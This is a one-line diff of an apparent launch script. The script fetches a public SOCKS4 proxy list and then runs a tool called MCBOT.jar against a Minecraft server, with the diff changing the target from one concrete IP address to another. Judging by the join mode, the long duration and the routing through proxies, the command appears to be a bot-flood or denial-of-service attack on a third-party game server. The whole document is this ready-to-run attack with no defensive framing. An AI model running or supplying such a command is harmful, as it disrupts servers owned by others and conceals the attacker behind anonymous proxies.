@@ -1,1 +1,1 @@
-curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o proxies.txt;java -jar MCBOT.jar 185.116.157.40:19096 758 join 360000 -1
+curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o proxies.txt;java -jar MCBOT.jar 163.44.252.211:25565 757 join 360000 -1
